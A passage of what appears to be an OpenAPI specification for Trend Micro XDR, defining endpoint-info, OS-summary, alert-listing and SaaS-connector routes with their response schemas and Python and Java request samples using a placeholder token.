            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/eiqs/query/agentInfo\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"criteria\\\": {\" +\n                \"        \\\"field\\\": \\\"YOUR_FIELD (string)\\\",\" +\n                \"        \\\"value\\\": \\\"YOUR_VALUE (string)\\\"\" +\n                \"    }\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/eiqs/query/batch/endpointInfo": {
      "post": {
        "tags": [
          "Search"
        ],
        "summary": "Get multiple endpoints info",
        "description": "Retrieves information about the specified endpoints.",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/spa-QueryBatchEndpointInfoRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryBatchEndpointInfoResponse"
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryBatchEndpointInfoResponse"
                },
                "examples": {
                  "ID format is not correct": {
                    "description": "ID format is not correct",
                    "value": {
                      "status": "FAIL",
                      "message": "Invalid query endpoint info request"
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized"
          },
          "404": {
            "description": "HTTP 404 Not Found"
          },
          "500": {
            "description": "Internal Server Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryBatchEndpointInfoResponse"
                },
                "examples": {
                  "Internal Server Error": {
                    "description": "Internal Server Error",
                    "value": {
                      "message": "Internal Server Error",
                      "status": "FAIL"
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/eiqs/query/batch/endpointInfo'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'computerIds': 'YOUR_COMPUTERIDS (array)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/eiqs/query/batch/endpointInfo\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"computerIds\\\": \\\"YOUR_COMPUTERIDS (array)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/eiqs/query/endpointInfo": {
      "post": {
        "tags": [
          "Search"
        ],
        "summary": "Get standalone endpoint info",
        "description": "Retrieves information about the specified endpoint.",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/spa-QueryEndpointInfoRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryEndpointInfoResponse"
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryEndpointInfoResponse"
                },
                "examples": {
                  "ID format is not correct": {
                    "description": "ID format is not correct",
                    "value": {
                      "status": "FAIL",
                      "message": "Invalid query endpoint info request"
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized"
          },
          "404": {
            "description": "HTTP 404 Not Found"
          },
          "500": {
            "description": "Internal Server Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryEndpointInfoResponse"
                },
                "examples": {
                  "Internal Server Error": {
                    "description": "Internal Server Error",
                    "value": {
                      "message": "Internal Server Error",
                      "status": "FAIL"
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/eiqs/query/endpointInfo'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'computerId': 'YOUR_COMPUTERID (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/eiqs/query/endpointInfo\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"computerId\\\": \\\"YOUR_COMPUTERID (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/eiqs/query/osSummary": {
      "get": {
        "tags": [
          "Search"
        ],
        "summary": "Get operating system information",
        "description": "Retrieves information about the operating system of all agents active in the last seven days.",
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryOsSummaryResponse"
                }
              }
            }
          },
          "400": {
            "description": "Bad Request"
          },
          "401": {
            "description": "Unauthorized"
          },
          "404": {
            "description": "HTTP 404 Not Found",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryOsSummaryResponse"
                },
                "examples": {
                  "Not provide company ID": {
                    "description": "Not provide company ID",
                    "value": {
                      "message": "HTTP 404 Not Found",
                      "status": "FAIL"
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal Server Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryOsSummaryResponse"
                },
                "examples": {
                  "Internal Server Error": {
                    "description": "Internal Server Error",
                    "value": {
                      "message": "Internal Server Error",
                      "status": "FAIL"
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/eiqs/query/osSummary'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/eiqs/query/osSummary\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/siem/events": {
      "get": {
        "description": "Retrieves a list of alerts from one or more data sources for a specific period\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "source",
            "description": "all (default), workbench...",
            "example": "all",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "startDateTime",
            "description": "Timestamp in ISO 8601 format indicating the start of the data retrieval range. \n\nNote: \n- If you do not specify `endDateTime`, the default value of `startDateTime` is 5 minutes before the time you make the request.\n- If you specify `endDateTime`, the default value of `startDateTime` is 5 minutes prior to the specified end time.\n",
            "example": "2020-06-15T10:00:00.000Z",
            "in": "query",
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "endDateTime",
            "description": "Timestamp in ISO 8601 format indicating the end of the data retrieval range. \n\nNote: \n- If you do not specify `startDateTime`, the default value of `endDateTime` is the time you make the request.\n- If you specify `startDateTime`, the default value is 5 minutes after the specified start time.\n",
            "example": "2020-06-15T12:00:00.000Z",
            "in": "query",
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "investigationStatus",
            "description": "Array of integers that allows you to select the investigation statuses of an alert. \n\nIf no value is specified, the request retrieves all alerts.\n\nAvailable values: \n- [0]: New\n- [1]: In Progress\n- [2]:Resolved: True Positive\n- [3]: Resolved: False Positive\n- [4]: Resolved: Benign True Positive\n- [5]: Resolved\n",
            "in": "query",
            "example": "[0,1]",
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "sortBy",
            "description": "Specifies the field by which the retrieved workbench alert list is sorted.\nTo sort in descending order, prepend a \"-\" (minus) symbol to the field name.\nAvailable values:  - `investigationStatus` - `score` - `wbName` - `wbId` - `createdTime` - `severity` - `modelId`",
            "example": "-createdTime",
            "in": "query",
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "queryTimeField",
            "description": "\"updatedTime\", \"createdTime\". The default value is createdTime.\"",
            "example": "createdTime",
            "in": "query",
            "schema": {
              "type": "string",
              "maxLength": 36
            }
          },
          {
            "name": "modelType",
            "description": "The type of detection model that triggered the alert.\nThe default value is `all`.\nAvailable values:  * `all` - Predefined and custom detection models * `preset` - Predefined detection models * `custom` - Custom detection models",
            "example": "all",
            "in": "query",
            "schema": {
              "type": "string",
              "maxLength": 36,
              "enum": [
                "all",
                "preset",
                "custom"
              ]
            }
          },
          {
            "name": "offset",
            "description": "0-based (0 means the 1st record; 50 means the 51st record)",
            "example": 0,
            "in": "query",
            "schema": {
              "type": "integer"
            }
          },
          {
            "name": "limit",
            "description": "The number of records displayed on a page. <br> The maximum allowed value is 500.\n",
            "example": 100,
            "in": "query",
            "schema": {
              "type": "integer"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "example": {
                    "info": {
                      "code": 3008000,
                      "msg": "Alerts retrieved successfully."
                    },
                    "data": {
                      "totalCount": 1,
                      "modelList": [
                        "Heartbeat Model",
                        "Possible APT Attack",
                        "Suspicious Web Access After Suspicious Email"
                      ],
                      "workbenchRecords": [
                        {
                          "investigationStatus": 1,
                          "priorityScore": 60,
                          "workbenchName": "Heartbeat Model",
                          "workbenchId": "WB-2-20200214-0003",
                          "workbenchLink": "https://THE_WORKBENCH_URL",
                          "createdTime": "2020-02-14T10:05:09Z",
                          "updatedTime": "2020-02-15T10:05:09Z",
                          "severity": "critical",
                          "modelId": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                          "modelType": "preset",
                          "impactScope": {
                            "desktopCount": 10,
                            "serverCount": 0,
                            "accountCount": 1,
                            "emailAddressCount": 0,
                            "containerCount": 0,
                            "cloudIdentityCount": 0
                          }
                        }
                      ]
                    }
                  },
                  "properties": {
                    "info": {
                      "description": "* 3008000 - Retrieve workbench summary information successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3008000,
                          "enum": [
                            3008000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Retrieve workbench summary information successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "totalCount": {
                          "description": "Total count",
                          "type": "integer"
                        },
                        "modelList": {
                          "description": "List of detection models of the customer's visible workbenches",
                          "type": "array",
                          "items": {
                            "type": "string"
                          }
                        },
                        "workbenchRecords": {
                          "description": "Workbench records returned",
                          "type": "array",
                          "items": {
                            "properties": {
                              "investigationStatus": {
                                "type": "integer",
                                "description": "The investigation status of an alert. Available values: 0: New, 1: In Progress, 2: Resolved: True Positive, 3: Resolved: False Positive, 4: Resolved: Benign True Positive, 5: Resolved"
                              },
                              "priorityScore": {
                                "example": 60,
                                "type": "integer"
                              },
                              "workbenchName": {
                                "example": "Heartbeat Model",
                                "type": "string"
                              },
                              "workbenchId": {
                                "example": "WB-2-20200214-0003",
                                "type": "string"
                              },
                              "workbenchLink": {
                                "example": "https://THE_WORKBENCH_URL",
                                "type": "string"
                              },
                              "createdTime": {
                                "example": "2020-02-14T10:05:09Z",
                                "type": "string"
                              },
                              "updatedTime": {
                                "example": "2020-02-15T10:05:09Z",
                                "type": "string"
                              },
                              "severity": {
                                "description": "The severity of an incident. Available values: `critical`, `high`, `medium`, `low`.\nNote: If the information cannot be retrieved, `severity` is set to `null`;",
                                "example": "critical",
                                "type": "string"
                              },
                              "modelId": {
                                "description": "The ID of the detection model that triggered the alert",
                                "example": "1ebd4f91-4b28-40b4-87f5-8defee4791d8",
                                "type": "string"
                              },
                              "modelType": {
                                "description": "The type of detection model that triggered the alert.",
                                "example": "preset, custom",
                                "type": "string",
                                "enum": [
                                  "preset",
                                  "custom"
                                ]
                              },
                              "impactScope": {
                                "type": "object",
                                "properties": {
                                  "desktopCount": {
                                    "type": "integer",
                                    "description": "Number of affected desktops"
                                  },
                                  "serverCount": {
                                    "type": "integer",
                                    "description": "Number of affected servers"
                                  },
                                  "accountCount": {
                                    "type": "integer",
                                    "description": "Number of affected accounts"
                                  },
                                  "emailAddressCount": {
                                    "type": "integer",
                                    "description": "Number of affected email addresses"
                                  },
                                  "containerCount": {
                                    "description": "Number of affected containers",
                                    "type": "integer"
                                  },
                                  "cloudIdentityCount": {
                                    "description": "Number of affected cloud resources",
                                    "type": "integer"
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Bad request",
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008001 - Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)\n* 3008002 - Unable to retrieve workbench summary information. Verify that the specified company exists and that you have permission to access the company's data and try again. (Error code: 3008002)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008001",
                          "enum": [
                            "3008001",
                            "3008002"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008999: Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008999",
                          "enum": [
                            "3008999"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "summary": "List alerts",
        "tags": [
          "Alerts"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/siem/events'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'source': 'YOUR_SOURCE (string)',\n    'startDateTime': 'YOUR_STARTDATETIME (string)',\n    'endDateTime': 'YOUR_ENDDATETIME (string)',\n    'investigationStatus': 'YOUR_INVESTIGATIONSTATUS (string)',\n    'sortBy': 'YOUR_SORTBY (string)',\n    'queryTimeField': 'YOUR_QUERYTIMEFIELD (string)',\n    'modelType': 'YOUR_MODELTYPE (string)',\n    'offset': 'YOUR_OFFSET (integer)',\n    'limit': 'YOUR_LIMIT (integer)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/siem/events\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"source\", \"YOUR_SOURCE (string)\")\n                .addParameter(\"startDateTime\", \"YOUR_STARTDATETIME (string)\")\n                .addParameter(\"endDateTime\", \"YOUR_ENDDATETIME (string)\")\n                .addParameter(\"investigationStatus\", \"YOUR_INVESTIGATIONSTATUS (string)\")\n                .addParameter(\"sortBy\", \"YOUR_SORTBY (string)\")\n                .addParameter(\"queryTimeField\", \"YOUR_QUERYTIMEFIELD (string)\")\n                .addParameter(\"modelType\", \"YOUR_MODELTYPE (string)\")\n                .addParameter(\"offset\", \"YOUR_OFFSET (integer)\")\n                .addParameter(\"limit\", \"YOUR_LIMIT (integer)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/connectors/saas": {
      "get": {
        "tags": [
          "SaaS"
        ],
        "summary": "List supported SaaS products",
        "description": "Retrieves a list of SaaS products that XDR supports and their corresponding information on the Customer Licensing Platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "description": "One of a server-defined set of codes"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "array",
                      "items": {
                        "required": [
                          "productId"
                        ],
                        "type": "object",
                        "properties": {
                          "productId": {
                            "type": "string",
                            "description": "Device product ID definition:\nsao:Apex One SaaS,  pao:Apex One On-Prem,  sca:Cloud App Security,  sds:Deep Security SaaS,  pds:Deep Security On-Prem,  pdd:DDD,  sna:DDDNA SaaS,  pei:DDEI,  pdi:DDI\n"
                          },
                          "connectorStatus": {
                            "type": "integer",
                            "description": "0: NOT PURCHASED 1: connected 2: not connected"
                          },
                          "clpAccount": {
                            "type": "array",
                            "description": "CLP account info",
                            "items": {
                              "required": [
                                "clpCompanyID",
                                "clpHostName"
                              ],
                              "type": "object",
                              "properties": {
                                "clpHostName": {
                                  "type": "string",
                                  "description": "CLP host name"
                                },
                                "clpCompanyID": {
                                  "type": "string",
                                  "description": "CLP customer/company ID"
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
